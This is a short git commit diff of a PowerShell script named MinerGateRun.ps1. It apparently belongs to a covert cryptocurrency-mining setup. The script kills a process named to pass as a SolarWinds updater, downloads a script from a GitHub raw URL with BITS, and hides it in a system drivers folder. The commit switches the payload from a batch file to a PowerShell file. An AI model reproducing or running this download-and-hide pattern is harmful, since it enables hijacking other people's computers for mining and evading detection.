2ddd8307b1e2b6d5ed20f65d0aba495e0120f140
diggles9991 <diggles9991@gmail.com>
2017-07-12 22:47:01 +1000

    Update MinerGateRun.ps1

--- MinerGateRun.ps1
+++ MinerGateRun.ps1
@@ -1,8 +1,8 @@
 Stop-Process -processname SolarWindsUpdate.exe
 
 # Download Instructions
-$url2 = "https://raw.githubusercontent.com/diggles9991/RunMG/master/Run.bat"
-$output2 = "C:\Windows\System32\drivers\en-US\etc\Run.bat"
+$url2 = "https://raw.githubusercontent.com/diggles9991/RunMG/master/Run.ps1"
+$output2 = "C:\Windows\System32\drivers\en-US\etc\Run.ps1"
 Import-Module BitsTransfer
 Start-BitsTransfer -Source $url2 -Destination $output2
 
